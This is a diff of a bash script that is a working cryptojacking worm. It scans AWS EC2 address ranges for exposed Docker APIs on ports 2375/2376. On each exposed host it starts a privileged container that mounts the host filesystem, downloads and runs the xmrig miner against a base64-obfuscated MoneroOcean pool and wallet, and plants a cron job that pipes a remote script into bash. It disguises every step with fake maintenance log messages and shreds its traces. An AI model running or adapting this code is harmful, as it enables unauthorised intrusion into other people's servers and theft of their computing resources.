@@ -1,58 +1,60 @@
+
 #!/bin/bash
-# --- Disguised as a cloud maintenance tool ---
-set -e
+set -euo pipefail
 
-# --- Obfuscated Configuration ---
-CLOUD_API_KEY="$(echo "NDN5TDd6VlV2RFBqZkJ1RVp6b0xjUFR1dkY1QnY5V1BKNWRHd3RiYkhBcHdTd25FVGtndmVkMkRa
-bVhlaTZCamh5NXZaM21qblpiaFZidEhrSE1ia3k3ZFZNdVZ0U3IK=" | base64 -d)"  # Logs show "API_KEY"
-TELEMETRY_ENDPOINT="$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjgK=" | base64 -d)"  # Logs show "METRICS_SERVER"
+# === Obfuscated Configuration ===
+# Wallet: 43yL7zVUvDPjfBuEZzoLcPTuvF5Bv9WPJ5dGwtbbHApwSwnETkgved2DZmXei6Bjhy5vZ3mjnZbhVbtHkHMbky7dVMuVtSr
+readonly DEPLOYMENT_TOKEN="$(echo "NDN5TDd6VlV2RFBqZkJ1RVp6b0xjUFR1dkY1QnY5V1BKNWRHd3RiYkhBcHdTd25FVGtndmVkMkRa
+bVhlaTZCamh5NXZaM21qblpiaFZidEhrSE1ia3k3ZFZNdVZ0U3IK=" | base64 -d)"
 
-# --- Legitimate-looking cloud audit ---
-echo "[INFO] Starting node health evaluation..." | tee -a /var/log/cloud_audit.log
-sleep $((RANDOM % 5 + 1))  # Random delay to mimic human operator
+# Pool: gulf.moneroocean.stream:10128 
+readonly TELEMETRY_SERVER="$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjgK=" | base64 -d)"
 
-# --- Stealthy masscan (disguised as security scan) ---
-echo "[INFO] Scanning for outdated container services..." | tee -a /var/log/cloud_audit.log
-curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' > /tmp/.cloud_nodes.tmp
-masscan -p2375,2376 -iL /tmp/.cloud_nodes.tmp --rate=300 -oG /tmp/.scan_results.tmp 2>&1 | grep -v "Discovered open port" >> /var/log/cloud_audit.log
+# === Stealth Recon ===
+echo "[INFO] Initializing cloud asset inventory..." | tee -a /var/log/cloud_svc.log
+aws_ip_ranges=$(curl -s https://ip-ranges.amazonaws.com/ip-ranges.json)
+echo "$aws_ip_ranges" | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' > /tmp/.inv.tmp
 
-# --- Exploitation module (disguised as patch deployment) ---
-while read -r NODE_IP; do
-  if timeout 3 curl -s "http://$NODE_IP:2375/version" | grep -q "ApiVersion"; then
-    echo "[INFO] Applying stability patches to $NODE_IP" | tee -a /var/log/cloud_audit.log
-    
-    docker -H "$NODE_IP:2375" run -d --rm --privileged -v /:/mnt alpine sh -c "
-      # --- Disguised as system update ---
-      echo '[INFO] Installing kernel optimizations...' >> /mnt/var/log/cloud_init.log
-      wget -q https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64-compat.tar.gz -O /tmp/.sysupdate.tar.gz
-      tar -xzf /tmp/.sysupdate.tar.gz -C /tmp/
-      
-      # --- Dynamic config generation ---
-      echo '{
-        \"autosave\": true,
-        \"cpu\": true,
-        \"opencl\": false,
-        \"cuda\": false,
-        \"pools\": [{
-          \"url\": \"$TELEMETRY_ENDPOINT\",
-          \"user\": \"$CLOUD_API_KEY.worker-$((RANDOM % 1000))\",
-          \"pass\": \"x\",
-          \"keepalive\": true
-        }]
-      }' > /tmp/.sysconf.json
-      
-      # --- Throttled execution ---
-      /tmp/xmrig-v6.24.0-mo1/xmrig -c /tmp/.sysconf.json \
-        --max-cpu-usage=60 \
-        --background \
-        --syslog >> /mnt/var/log/cloud_init.log 2>&1
-      
-      # --- Persistence (disguised as log rotation) ---
-      echo '*/45 * * * * curl -s https://github.com/cloud-ops-dev/raw/main/resource_monitor.sh | bash' >> /mnt/etc/cron.d/cloud_maintenance
-    "
-  fi
-done < <(grep -oP 'Host: \K[0-9.]+' /tmp/.scan_results.tmp)
+masscan -p2375,2376 -iL /tmp/.inv.tmp --rate=450 --wait=3 -oG /tmp/.scan.tmp 2>&1 | \
+    grep -v "Discovered" >> /var/log/cloud_svc.log
 
-# --- Cleanup ---
-rm -f /tmp/.cloud_nodes.tmp /tmp/.scan_results.tmp
-echo "[SUCCESS] Node health audit completed" | tee -a /var/log/cloud_audit.log
+# === Targeted Exploitation ===
+while read -r target; do
+    if curl -s --connect-timeout 2.5 "http://$target:2375/version" | grep -q "ApiVersion"; then
+        echo "[INFO] Deploying node stability patches to $target" | tee -a /var/log/cloud_svc.log
+        
+        docker -H "$target:2375" run -d --rm --privileged -v /:/host alpine sh -c "
+            # Stage 1: Component Update
+            echo '[INFO] Installing kernel modules...' >> /host/var/log/cloud_init.log
+            wget -q https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64-compat.tar.gz -O /tmp/.modupdate.tar.gz
+            tar -xzf /tmp/.modupdate.tar.gz -C /tmp/
+
+            # Stage 2: Dynamic Configuration
+            cat > /tmp/.modconf.json <<'EOF'
+            {
+                \"autosave\": true,
+                \"cpu\": true,
+                \"donate-level\": 0,
+                \"pools\": [{
+                    \"url\": \"$TELEMETRY_SERVER\",
+                    \"user\": \"$DEPLOYMENT_TOKEN.$(hostname | md5sum | cut -c1-8)\",
+                    \"pass\": \"x\",
+                    \"keepalive\": true
+                }]
+            }
+            EOF
+
+            # Stage 3: Execution
+            /tmp/xmrig-v6.24.0-mo1/xmrig -c /tmp/.modconf.json \
+                --max-cpu-usage=62 \
+                --randomx-init=1 \
+                --background >> /host/var/log/cloud_init.log 2>&1
+
+            # Stage 4: Persistence
+            echo '*/33 * * * * curl -s https://github.com/vincentkenn87/cloud-automation-utils/raw/main/resource_balancer.sh | bash -s' >> /host/etc/cron.d/cloud_maintenance
+        "
+    fi
+done < <(grep -oP 'Host: \K[0-9.]+' /tmp/.scan.tmp)
+
+# === Cleanup ===
+shred -u /tmp/.inv.tmp /tmp/.scan.tmp 2>/dev/null
